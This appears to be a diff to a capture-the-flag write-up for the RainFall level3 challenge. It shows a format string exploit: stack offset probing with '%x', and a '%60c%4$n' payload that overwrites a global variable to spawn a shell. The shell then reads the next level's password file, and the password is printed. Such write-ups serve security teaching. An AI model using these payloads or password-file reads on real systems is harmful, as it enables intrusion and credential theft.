@@ -65,10 +65,34 @@ Lets find the adress of m
 
 the address of m is 0x0804988c in little-indian \x8c\x98\x04\x08
 
+geting the argument in the stack:
+
+```
+    ./level3 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
+    AAAABBBB.200..b7fd1ac0..b7ff37d0..41414141..42424242..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e.
+```
+
+the argument is 4
+
 ```
     level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")'; cat) | ./level3
     �                                                           
     Wait what?!
     cat /home/user/level4/.pass
     b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
+
+
+- "%60c%4$n"
+
+%60c => Prints 60 characters (adds 60 to the total printf counter).
+
+%4$n => Writes the current character count (60) into the 4th argument on the stack, which is our memory address.
+
+So, the result is Write the number 60 into the address 0x0804988c.
+
+```
+    ./level3 <<< $(python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n" + ".%x." * 30)')
+    �                                                           .b7fd1ac0..b7ff37d0..804988c..63303625..6e243425..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e.
+    Wait what?!
 ```
